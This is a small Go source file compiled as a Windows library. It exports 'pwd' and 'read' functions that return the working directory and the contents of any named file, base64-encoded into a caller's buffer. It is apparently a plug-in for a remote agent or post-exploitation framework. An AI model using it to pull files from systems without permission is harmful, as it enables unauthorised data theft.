//go:build windows
package main

/*
#include <string.h>
#include <stdlib.h>
*/
import "C"

import (
	"os"
	"encoding/base64"
	"unsafe"
)

//export pwd
func pwd(output *C.char, size C.int, arg1 *C.char, arg2 *C.char) {
	dir, err := os.Getwd()
	result := ""
	if err != nil {
		result = "error: " + err.Error()
	} else {
		result = dir
	}
	encoded := base64.StdEncoding.EncodeToString([]byte(result))
	max := int(size) - 1
	if len(encoded) > max {
		encoded = encoded[:max]
	}
        en := C.CString(encoded)
	defer C.free(unsafe.Pointer(en))
	C.strncpy(output, en, C.size_t(size))
}

//export read
func read(output *C.char, size C.int, file *C.char, _ *C.char) {
	path := C.GoString(file)
	data, err := os.ReadFile(path)
	result := ""
	if err != nil {
		result = "error: " + err.Error()
	} else {
		result = base64.StdEncoding.EncodeToString(data)
	}

	max := int(size) - 1
	if len(result) > max {
		result = result[:max]
	}
	C.strncpy(output, C.CString(result), C.size_t(size))
}

func main() {}
